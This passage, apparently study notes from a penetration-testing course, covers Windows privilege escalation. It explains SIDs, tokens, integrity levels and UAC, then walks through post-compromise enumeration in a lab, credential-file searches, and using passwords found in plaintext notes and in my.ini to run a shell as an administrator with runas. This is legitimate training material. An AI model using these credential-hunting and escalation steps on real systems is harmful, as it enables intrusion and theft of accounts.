# Windows Privilege Escalation
During a penetration test, we often gain our initial foothold on a Windows system as an unprivileged user
+ However, we usually need administrative privileges to search for sensitive information in other users' home directories, examine configuration files on the system, or extract password hashes with _Mimikatz_ 
+ The process of elevating our privileges and access from unprivileged to privileged is called _Privilege Escalation_

While this Module focuses on Windows, the next Module will explore privilege escalation techniques on Linux systems
+ Once we've completed both, we will not only understand how the security models and attack surfaces of the two operating systems differ, but also how we can leverage privilege escalation vectors on each of them

## Enumerating Windows
Every target can be considered unique due to differences in OS versions, patch levels, system configuration, etc
+ Therefore, it is important for us to understand how to obtain and leverage information about the target system to achieve privilege escalation
+ To fully grasp the attack vectors of this Module, we'll first need to get familiar with the Windows privilege structure and access control mechanisms

While it is very common to use technical attack vectors to achieve privilege escalation, it's often sufficient to merely review information that users and the system leave behind
+ A couple examples are when a user stores passwords in a text file or Windows records the input of a password in PowerShell
+ For attackers, this can be a gold mine that leads to higher privileges

### Understanding Windows Privileges and Access Control Mechanisms
Privileges on the Windows operating system refer to the permissions of a specific account to perform system-related local operations (e.g. modifying the filesystem or adding users)
+ To grant or deny these operations, Windows needs control mechanisms to identify the source of the operation and determine if the privileges for the operation are sufficient

In this section, we'll cover four different concepts and mechanisms: _Security Identifier_ (SID),_access token_, _Mandatory Integrity Control_, and _User Account Control_

#### SID
Windows uses a SID to identify entities
+ A SID is a unique value assigned to each entity, or _principal_, that can be authenticated by Windows, such as users and groups
+ The SID for local accounts and groups is generated by the _Local Security Authority_ (LSA), and for domain users and domain groups, it's generated on a _Domain Controller_ (DC)
+ The SID cannot be changed and is generated when the user or group is created
+ Windows uses only the SID, not usernames, to identify principals for access control management

The SID string consists of different parts, delimited by "-", and represented by the placeholders "S", "R", "X", and "Y" in the following listing
+ This representation is the fundamental structure of a SID:
```
S-R-X-Y
```
1. The first part is a literal "**S**", which indicates that the string is a SID
2. "**R**" stands for _revision_ and is always set to "1", since the overall SID structure continues to be on its initial version
3. "**X**" determines the identifier authority. This is the authority that issues the SID. For example, "5" is the most common value for the identifier authority. It specifies _NT Authority_ and is used for local or domain users and groups.
4. "**Y**" represents the sub authorities of the identifier authority. Every SID consists of one or more sub authorities. This part consists of the domain identifier and _relative identifier_ (RID). The domain identifier is the SID of the domain for domain users, the SID of the local machine for local users, and "32" for built-in principals. The RID determines principals such as users or groups

The following listing shows an example SID of a local user on a Windows system:
```
S-1-5-21-1336799502-1441772794-948155058-1001
```
+ Above shows that the RID is 1001. Because the RID starts at 1000 for nearly all principals, this implies that this is the second local user created on the system

There are SIDs that have a RID under 1000, which are called _well-known SIDs_
+ These SIDs identify generic and built-in groups and users instead of specific groups and users
+ The following listing contains some useful well-known SIDs in the context of privilege escalation
```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

While we won't directly work with SIDs in this Module, knowing how Windows identifies principals is necessary to understand access tokens
+ Additionally, it's vital in the upcoming Active Directory Modules

#### Access tokens
Now that we know how Windows identifies principals on a system, let's discuss how Windows determines whether to grant or deny operations
+ Once a user is authenticated, Windows generates an access token that is assigned to that user
+ The token itself contains various pieces of information that effectively describe the _security context_ of a given user
+ The security context is a set of rules or attributes that are currently in effect

The security context of a token consists of the SID of the user, SIDs of the groups the user is a member of, the user and group privileges, and further information describing the scope of the token
+ When a user starts a process or thread, a token will be assigned to these objects
+ This token, called a _primary token_, specifies which permissions the process or threads have when interacting with another object and is a copy of the access token of the user

A thread can also have an _impersonation token_ assigned
 + Impersonation tokens are used to provide a different security context than the process that owns the thread
 + This means that the thread interacts with objects on behalf of the impersonation token instead of the primary token of the process

#### Integrity levels
In addition to SIDs and tokens, Windows also implements what is known as Mandatory Integrity Control
+ It uses _integrity levels_ to control access to securable objects
+ We can think of these levels as hierarchies of trust Windows has in a running application or securable object

When processes are started or objects are created, they receive the integrity level of the principal performing this operation
+ One exception is if an executable file has a low integrity level, the process's integrity level will also be low
+ A principal with a lower integrity level cannot write to an object with a higher level, even if the permissions would normally allow them to do so

From Windows Vista onward, processes run on five integrity levels:
- **System**: SYSTEM (kernel, ...)
- **High**: Elevated users
- **Medium**: Standard users
- **Low**: Very restricted rights often used in sandboxed`[^privesc_win_sandbox]` processes or for directories storing temporary data
- **Untrusted**: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk

We can display the integrity level of processes with _Process Explorer_ for our current user with _whoami /groups_, and for files with _icacls_

For example, the following figure shows two PowerShell processes on a Windows system in Process Explorer. One started as a regular user and the other as an administrative user
![[Pasted image 20231109113253.png]]

The PowerShell processes have the integrity level of _High_ and _Medium_
+ We can infer that the _High_ integrity level process is started by the administrative user and the _Medium_ integrity level process by the regular user

#### User Account Control
Finally, another Windows security technology we need to consider is _User Account Control_ (UAC)
+ UAC is a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator
+ For this, an administrative user obtains two access tokens after a successful logon
	+ The first token is a standard user token (or _filtered admin token_), which is used to perform all non-privileged operations
	+ The second token is a regular administrator token
		+ It will be used when the user wants to perform a privileged operation
		+ To leverage the administrator token, a UAC consent prompt[10](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/windows-privilege-escalation/enumerating-windows/understanding-windows-privileges-and-access-control-mechanisms#fn10) needs to be confirmed

### Situational Awareness
Now that we have a basic understanding of Windows privileges, we'll cover various methods to get situational awareness on a system
+ Let's assume we used a client-side attack or exploited a vulnerability to access a Windows system as an unprivileged user
+ Before we attempt to elevate our privileges, we must obtain information about the system we are on

This is a crucial step to better understand the nature of the compromised machine and discover possible vectors for privilege escalation
+ However, it is often skipped or minimized by inexperienced penetration testers since sifting through and interpreting a lot of information is not as exciting as attacking services or machines
+ Experienced penetration testers know that by gathering as much information as possible, they obtain valuable information about the target system they can use to create various actionable vectors to elevate their privileges

There are several key pieces of information we should always obtain:
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

After we perform the enumeration steps to obtain this information, we will have a solid understanding of our target system
+ Let's start gathering the information on the _CLIENTWK220_ system
+ In this example, we'll assume that we previously started a bind shell on port 4444 through a client-side attack

#### Username and Hostname
Now, let's demonstrate how to obtain the information
+ For this, we'll connect to the target system with netcat and enter `whoami` to obtain the first pieces of information: the **username and hostname**
+ Usage and example output:
```
C:\Users\dave>whoami
whoami
clientwk220\dave
```
+ Above shows that we have command execution as user _dave_
+  Additionally, the output contains the hostname of the system, _clientwk220_
+ This hostname implies that our bind shell runs on a client system rather than on a server

The hostname often can be used to infer the purpose and type of a machine
+ For example, if it is _WEB01_ for a web server or _MSSQL01_ for a _MSSQL_ server

#### Group memberships of the current user
Next, we want to check which groups _dave_ is in
+ To display all groups our current user is a member of, we can use `whoami /groups`
+ Usage and example output:
```
C:\Users\dave> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID                                            Attributes                                        
====================================== ================ ============================================== ==================================================
Everyone                             Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
CLIENTWK220\helpdesk                 Alias            S-1-5-21-2309961351-4093026482-2223492918-1008 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users         Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
... 
```
+ The output shows that _dave_ is a member of the _helpdesk_ group
+ Helpdesk staff often have additional permissions and access compared to standard users

Additionally, the user is a member of _BUILTIN\Remote Desktop Users_
+ Membership of this group offers the possibility to connect to the system via RDP

The other groups _dave_ is a member of are standard for non-privileged users such as _Everyone_ and _BUILTIN\Users_

#### Existing users and groups
The next piece of information we are interested in are other users and groups on the system
+ We can use the `net user` command or the `Get-LocalUser` Cmdlet to obtain a list of all local users
+ Let's use the latter by starting PowerShell and running `Get-LocalUser`
+ Usage and example output:
```
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> Get-LocalUser
Get-LocalUser

Name               Enabled Description                                                                              
----               ------- -----------                                                                              
Administrator      False   Built-in account for administering the computer/domain
BackupAdmin        True
dave               True    dave 
daveadmin          True 
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
offsec             True
steve              True
... 
```

The output shows several interesting items that can help us to get an overview of the system
+ The first one is that the built-in _Administrator_ account is disabled
+ Next, two presumed regular users called _steve_ and _dave_ exist
+ In addition, we have identified two other users named _daveadmin_ and _BackupAdmin_
	+ Both usernames contain "admin", which implies that they are potentially administrative users, making them valuable targets

We can also assume that _daveadmin_ is the privileged account of _dave_
+ Administrators often have both a non-privileged and a privileged account
+ They use the non-privileged account for day-to-day work and the privileged account for administrative tasks
+ For security reasons, they don't use the privileged account for performing potentially unsafe tasks such as browsing the internet

Before we make further assumptions, let's enumerate the existing groups on _CLIENTWK220_.
+ We can choose between the command `net localgroup` or `Get-LocalGroup` in PowerShell
+ Usage and example output:
```
PS C:\Users\dave> Get-LocalGroup
Get-LocalGroup

Name                                Description                                                                      
----                                -----------                                                                     
adminteam                  Members of this group are admins to all workstations on the second floor
BackupUsers 
helpdesk
...
Administrators                      Administrators have complete and unrestricted access to the computer/domain
...
Remote Desktop Users                Members in this group are granted the right to logon remotely
...  
```
+ Non-standard groups _adminteam_, _BackupUsers_, and _helpdesk_

The _adminteam_ group may be of interest to us since it contains the string "admin" and has a custom description text, indicating the members are admins to all workstations on the second floor
+ However, we don't currently have any further information regarding which floors exist or which departments are on which floors

Another interesting finding is the group name _BackupUsers_ as with the user _BackupAdmin_ before
+ Backup solutions often have extensive permissions to perform their operations on the file system, making both potentially valuable targets

##### Built in Groups
Apart from the non-standard groups, there are several built-in groups we should analyze, such as _Administrators_, _Backup Operators_, _Remote Desktop Users_, and _Remote Management Users_
+ Members of _Backup Operators_ can backup and restore all files on a computer, even those files they don't have permissions for
+ We must not confuse this group with non-standard groups such as _BackupUsers_ in our example

Members of _Remote Desktop Users_ can access the system with RDP, while members of _Remote Management Users_ can access it with _WinRM_

For this example, let's review the members of _adminteam_ and _Administrators_
+  can do this with `Get-LocalGroupMember`, passing the group name as an argument
```
PS C:\Users\dave> Get-LocalGroupMember adminteam
Get-LocalGroupMember adminteam

ObjectClass Name                PrincipalSource
----------- ----                ---------------
User        CLIENTWK220\daveadmin Local 

PS C:\Users\dave> Get-LocalGroupMember Administrators
Get-LocalGroupMember Administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local          
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\backupadmin     Local  
User        CLIENTWK220\offsec        Local
```
+ Above shows that only _daveadmin_ is a member of _adminteam_
+ However, _adminteam_ is not listed in the local _Administrators_ group
+ We only know that members of the group are administrators to workstations on the second floor
+ The information we have gathered thus far is not directly actionable, but it may become so when we move deeper into the network and identify which systems reside on the second floor

The output also shows that apart from the disabled local _Administrator_ account, the users _daveadmin_ and _BackupAdmin_ are members of the local _Administrators_ group
+ Therefore, we've now identified two highly valuable targets

While it is crucial to know which users are privileged, it is also vital for us to understand which users can use RDP
+ Obtaining the credentials for one of these users may lead us to a GUI access, which often tremendously improves our means of interacting with the system

We've collected quite some information about the users and groups on the target system. Let's briefly summarize what we know so far:
+ Our bind shell runs as the user _dave_ on a machine with the hostname _CLIENTWK220_. This user is in a group named _helpdesk_. Additionally, there is another user named _daveadmin_ which is probably the person's privileged account, while _dave_ may be used for day to day work. The user _daveadmin_ is also in a group named _adminteam_, whose description indicates it has administrative privileges on all workstations on the second floor. Furthermore, _daveadmin_ and _BackupAdmin_ are local Administrators on _CLIENTWK220_

#### Operating system, version and architecture
Next, we'll gather information about the actual target machine, its configuration, and applications running on it

Let's check the operating system, version, and architecture first
+ Can use `systeminfo` to gather this information
```
PS C:\Users\dave> systeminfo
systeminfo

Host Name:                 CLIENT220
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
...
System Type:               x64-based PC
...
```
+ Above shows that our bind shell runs on a Windows 11 Pro system
+ To get the exact version, we can use the build number and review the existing versions of the identified operating system, In our case, build 22000 is the version _21H2_ of Windows 11
+ Additionally, the output contains the information that our bind shell runs on a 64-bit system
	+ This information becomes relevant when we want to run binary files on the system, since we cannot run a 64-bit application on a 32-bit system

#### Network information
Next, let's move down the list and review the network information we can obtain as _dave_
+ Our goal in this step is to identify all network interfaces, routes, and active network connections
+ Based on this information, we may identify new services or even access to other networks
+ This information may not directly lead us to elevated privileges, but they are vital to understand the machine's purpose and to obtain vectors to other systems and networks
+ **NOTE**: Obtaining privileged access on every machine in a penetration test is rarely a useful or realistic goal. While most machines in the challenge labs of this course are rootable, we'll face numerous non-rootable machines in real-life assessments. A skilled penetration tester's goal is therefore not to blindly attempt privilege escalation on every machine at any cost, but to identify machines where privileged access leads to further compromise of the client's infrastructure

To list all network interfaces, we can use `ipconfig` with the argument `/all`
+ Usage and example output:
```
PS C:\Users\dave> ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : clientwk220
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-8A-80-16
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::cc7a:964e:1f98:babb%6(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.50.220(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
   DHCPv6 IAID . . . . . . . . . . . : 234901590
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-3B-F7-25-00-50-56-8A-80-16
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

The output shows some interesting information
+ For example, the system is not configured to get an IP address via DHCP, but it was set manually
+ Furthermore, it contains the DNS server, gateway, subnet mask, and MAC address
+ These pieces of information will be useful when we attempt to move to other systems or networks

To display the routing table, which contains all routes of the system, we can use `route print`
+ The output of this command is useful to determine possible attack vectors to other systems or networks
+ Usage and example output:
```
PS C:\Users\dave> route print
route print
===========================================================================
Interface List
  6...00 50 56 8a 80 16 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0   192.168.50.254   192.168.50.220    271
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     192.168.50.0    255.255.255.0         On-link    192.168.50.220    271
   192.168.50.220  255.255.255.255         On-link    192.168.50.220    271
   192.168.50.255  255.255.255.255         On-link    192.168.50.220    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    192.168.50.220    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    192.168.50.220    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0   192.168.50.254  Default 
===========================================================================
...
```
+ Above shows no routes to any previously unknown networks. However, we should always check the routing table on a target system to ensure we don't miss any information

To list all active network connections we can use _netstat_ with the argument **-a** to display all active TCP connections as well as TCP and UDP ports, **-n** to disable name resolution, and **-o** to show the process ID for each connection: `netstat -ano`
+ Usage and example output:
```
PS C:\Users\dave> netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       6824
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       960
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       6824
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1752
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1084
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       3288
...
  TCP    192.168.50.220:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.50.220:3389    192.168.119.4:33060    ESTABLISHED     1084
  TCP    192.168.50.220:4444    192.168.119.3:51082    ESTABLISHED     2044
...
```
+ Above shows that ports 80 and 443 are listening, usually indicating that a web server is running on the system
+ Additionally, an open port of 3306 is indicative of a running _MySQL_ server
+ The output also shows our Netcat connection on port 4444 as well as an RDP connection from 192.168.119.4 on port 3389
	+ This means we are not the only user currently connected to the system
	+ Once we manage to elevate our privileges, we could use _Mimikatz_ and attempt to extract credentials of the user

#### Installed applications
Next, we'll check all installed applications
+ Can query two registry keys to list both 32-bit and 64-bit applications in the _Windows Registry_ with the `Get-ItemProperty` Cmdlet
+ We pipe the output to **select** with the argument **displayname** to only display the application's names
+ We begin with the 32-bit applications and then display the 64-bit applications
+ Usage (32):
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
+ Usage (64):
```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
+ Example:
```
PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

displayname                                                       
-----------                                                       
KeePass Password Safe 2.51.1                                      
Microsoft Edge                                                    
Microsoft Edge Update                                             
Microsoft Edge WebView2 Runtime                                   
...
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913    
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913       
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913

PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

DisplayName                                                   
-----------                                                   
7-Zip 21.07 (x64)                                             
...
XAMPP
VMware Tools                                                  
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913  
```

Above shows that apart from standard Windows applications, the _KeePass_ password manager, _7-Zip_, and _XAMPP_ are installed on CLIENTWK220

As discussed in the Module "Locating Public Exploits", we could search for public exploits for the identified applications after we finish the situational awareness process
+ We could also leverage password attacks to retrieve the master password of the password manager to potentially obtain other passwords, enabling us to log on as a privileged user

However, the listed applications from above may not be complete
+ For example, this could be due to an incomplete or flawed installation process
+ Therefore, we should always check 32-bit and 64-bit **Program Files** directories located in **`C:\`**. Additionally, we should review the contents of the **Downloads** directory of our user to find more potential programs

#### Running processes
While it is important to create a list of installed applications on the target system, it is equally important to identify which of them are currently running
+ For this, we'll review the running processes of the system with `Get-Process`
```
PS C:\Users\dave> Get-Process
Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                               
-------  ------    -----      -----     ------     --  -- -----------                                                
     49      12      528       1152       0.03   2044   0 access
...
    477      49    17328      23904              6068   0 httpd
    179      29     9608      19792              6824   0 httpd
...                                                 
    174      16   210620      29048              1752   0 mysqld
...                                                  
    825      40    75804      14404       5.91   6332   0 powershell
...                                                
    379      24     6864      30236              2272   1 xampp-control
...
```
+ It contains our bind shell with ID 2044 and the PowerShell session we started for the enumeration process with ID 6332
+ Can confirm that the process ID 1752 belongs to _mysqld_ and ID 6824 to Apache displayed as _httpd_
+ Due to the active process named _xampp-control_, we can infer that both Apache and MySQL were started through XAMPP

### Hidden in Plain View
Based on the information found in the previous section, we can assume that the users on CLIENTWK220 use a password manager
+ However, we should never underestimate the laziness of users when it comes to passwords and sensitive information
+ What was traditionally the Post-it note with the password under the keyboard is now quite often a text file on the desktop
+ While browsing the home directory of our user or publicly accessible folders, we can retrieve various pieces of sensitive information, which may provide us a vector for privilege escalation

For example, sensitive information may be stored in meeting notes, configuration files, or onboarding documents
+ With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files

Now, let's search CLIENTWK220 for sensitive information
+ We have identified that KeePass and XAMPP are installed on the system and therefore, we should search for password manager databases and configuration files of these applications
+ For this, we again connect to the system's bind shell. Let's begin our search by entering **`C:\`** as argument for **-Path** and **`*.kdbx`** as argument for **-Include** to search for all password manager databases on the system with `Get-ChildItem` in PowerShell
+ Usage:
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Next, let's search for sensitive information in configuration files of XAMPP
+ After reviewing the documentation,[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/windows-privilege-escalation/enumerating-windows/hidden-in-plain-view#fn2) we enter **`*.txt,*.ini`** for **-Include** because these file types are used by the application for configuration files. Additionally, we enter **`C:\xampp`** as argument for **-Path**
+ Usage:
```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
+ Example usage and output:
```
PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
...
Directory: C:\xampp\mysql\bin

Mode                 LastWriteTime         Length Name                                               
----                 -------------         ------ ----                                               
-a----         6/16/2022   1:42 PM           5786 my.ini
...
Directory: C:\xampp

Mode                 LastWriteTime         Length Name                                              
----                 -------------         ------ ----                                                                 
-a----         3/13/2017   4:04 AM            824 passwords.txt
-a----         6/16/2022  10:22 AM            792 properties.ini     
-a----         5/16/2022  12:21 AM           7498 readme_de.txt 
-a----         5/16/2022  12:21 AM           7368 readme_en.txt     
-a----         6/16/2022   1:17 PM           1200 xampp-control.ini  
```
+ Above shows us that our search returned two files that may contain sensitive information
+ The file **my.ini** is the configuration file for MySQL and **passwords.txt** contains the default passwords for the different XAMPP components

Let's review them
```
PS C:\Users\dave> type C:\xampp\passwords.txt
type C:\xampp\passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)
...
   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 
...

PS C:\Users\dave> type C:\xampp\mysql\bin\my.ini
type C:\xampp\mysql\bin\my.ini
type : Access to the path 'C:\xampp\mysql\bin\my.ini' is denied.
At line:1 char:1
+ type C:\xampp\mysql\bin\my.ini
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\xampp\mysql\bin\my.ini:String) [Get-Content], UnauthorizedAccessEx 
   ception
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```
+ Unfortunately, the file **`C:\xampp\passwords.txt`** only contains the unmodified default passwords of XAMPP
+ Furthermore, we don't have permissions to view the contents of **`C:\xampp\mysql\bin\my.ini`**

Next, let's search for documents and text files in the home directory of the user _dave_. We enter **`*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx`** as file extensions to search for and set **-Path** to the home directory
+ Usage:
```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

Can for example show a text file on the desktop of _dave_ named **asdf.txt**. Let's check the contents of this file
```
PS C:\Users\dave> cat Desktop\asdf.txt
cat Desktop\asdf.txt
notes from meeting:

- Contractors won't deliver the web app on time
- Login will be done via local user credentials
- I need to install XAMPP and a password manager on my machine 
- When beta app is deployed on my local pc: 
Steve (the guy with long shirt) gives us his password for testing
password is: securityIsNotAnOption++++++
```
+ Above shows that the file was used for meeting notes. The note states that the web application uses local users' credentials and that for testing "Steve's" password **`securityIsNotAnOption++++++`** can be used

The information gathered in the situational awareness process comes in handy now, since we already know that a user named _steve_ exists on the target system
+ Before we attempt to leverage the password, let's check what groups _steve_ is a member of. This time, we use the command **net user** with the username _steve_ to obtain this information

```
PS C:\Users\dave> net user steve
net user steve
User name                    steve
...
Last logon                   6/16/2022 1:03:52 PM

Logon hours allowed          All

Local Group Memberships      *helpdesk             *Remote Desktop Users 
                             *Remote Management Use*Users                
...
```
+ While the output of Listing 22 shows that _steve_ is not a member of the group _Administrators_, the user is a member of the group _Remote Desktop Users_

Let's connect to CLIENTWK220 with RDP as _steve_ and open PowerShell
![[Pasted image 20231109154930.png]]

Due to access as new user, and therefore different permissions on files on the system, the process of searching for sensitive information begins again
+ This is a great opportunity to zoom out here for a moment
+ With access to a new user, the process of searching for sensitive information starts again
+ This is not only true for this specific case, but also for nearly all areas of a penetration test
+ The cyclical nature of a penetration test is an important concept for us to grasp, because it provides a mindset of continuously reevaluating and including new information and access in order to follow previously inapproachable or newly identified attack vectors

In our search as _dave_ we received a permission error on **C:\xampp\mysql\bin\my.ini**. Let's begin by checking if we have access to it as _steve_
```
PS C:\Users\steve> type C:\xampp\mysql\bin\my.ini
# Example MySQL config file for small systems.
...

# The following options will be passed to all MySQL clients
# backupadmin Windows password for backup job
[client]
password       = admin123admin123!
port=3306
socket="C:/xampp/mysql/mysql.sock"
```
+ Above shows that we could access **my.ini** and display its contents
+ The file contains the manually set password _`admin123admin123!`_
+ Additionally, a comment states that this is also the Windows password for _`backupadmin`_

Let's review the groups that _backupadmin_ is a member of to find out if we can use services such as RDP or WinRM to connect to the system as this user
```
PS C:\Users\steve> net user backupadmin
User name                    BackupAdmin
...

Local Group Memberships      *Administrators       *BackupUsers
                             *Users
Global Group memberships     *None
The command completed successfully.
```
+ Unfortunately, _backupadmin_ is not a member of the groups _Remote Desktop Users_ or _Remote Management Users_
+ This means we need to find another way to access the system or execute commands as _backupadmin_

Since we have access to a GUI we can use _Runas_, which allows us to run a program as a different user
+ Runas can be used with local or domain accounts as long as the user has the ability to log on to the system

Without access to a GUI we cannot use Runas since the password prompt doesn't accept our input in commonly used shells, such as our bind shell or WinRM

However, we can use a few other methods to access the system as another user when certain requirements are met
+ We can use WinRM or RDP to access the system if the user is a member of the corresponding groups
+ Alternatively, if the target user has the _Log on as a batch job_ access right, we can schedule a task to execute a program of our choice as this user
+ Furthermore, if the target user has an active session, we can use _PsExec_ from Sysinternals

Since we have access to a GUI, let's use Runas in PowerShell to start _cmd_ as user _backupadmin_
+ We'll enter the username as argument for **/user:** and the command we want to execute
+ Once we execute the command, a password prompt appears in which we'll enter the previously found password
+ Usage and example output:
```
PS C:\Users\steve> runas /user:backupadmin cmd
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
PS C:\Users\steve> 
```

Once the password is entered, a new command line window appears
+ The title of the new window states _running as CLIENTWK220\backupadmin_
+ Let's use **whoami** to confirm the command line is working and we are indeed _backupadmin_:
![[Pasted image 20231109155336.png]]

#### Strings in Files
Can search for specific strings in files with the following:
```
Get-ChildItem -Path <PATH> -Include * -File -Recurse -ErrorAction SilentlyContinue | Select-String <STRING>
```

### Information Goldmine PowerShell
In the previous section, we discussed how we can use sensitive information found in plain-text files to elevate our privileges
+ Over the last decade, IT security awareness for the average enterprise user has tremendously improved through training, IT policies, and the prevalent threat of cyber attacks painted by media
+ Fortunately, this has led to less sensitive information being stored in notes or text files

Because of the growing threat of cyber attacks, more defensive measures were developed and implemented for clients and servers alike
+ One of these measures is to collect and record more data on systems about executed commands and operations, which allows the IT staff to review and respond accordingly to threats
+ One important source of this information is PowerShell, since it is a vital resource for attackers

With default settings, Windows only logs a small amount of information on PowerShell usage, which is not sufficient for enterprise environments
+ Therefore, we'll often find PowerShell logging mechanisms enabled on Windows clients and servers
+ Two important logging mechanisms for PowerShell are _PowerShell Transcription_ and _PowerShell Script Block Logging_

**Transcription** is often referred to as "over-the-shoulder-transcription", because, when enabled, the logged information is equal to what a person would obtain from looking over the shoulder of a user entering commands in PowerShell
+ The information is stored in _transcript files_, which are often saved in the home directories of users, a central directory for all users of a machine, or a network share collecting the files from all configured machines

**Script Block Logging** records commands and blocks of script code as events while executing
+ This results in a much broader logging of information because it records the full content of code and commands as they are executed
+ This means such an event also contains the original representation of encoded code or commands

Both mechanisms are quite powerful and have become increasingly common in enterprise environments
+ However, while they are great from the defensive perspective, they often contain valuable information for attackers

In this example, we'll demonstrate how we can retrieve information recorded by PowerShell with the help of enabled logging mechanisms and the PowerShell history
+ We'll again connect on port 4444 to the bind shell running as the user _dave_ and launch PowerShell

For the purpose of this demonstration, we'll assume that the files containing sensitive information from the previous section don't exist
+ Before we check if Script Block Logging or PowerShell Transcription is enabled, we should always check the PowerShell history of a user
+ We can use the _Get-History_ Cmdlet to obtain a list of commands executed in the past
+ Usage:
```
Get-History
```

At this point, we have to explore how PowerShell's history works
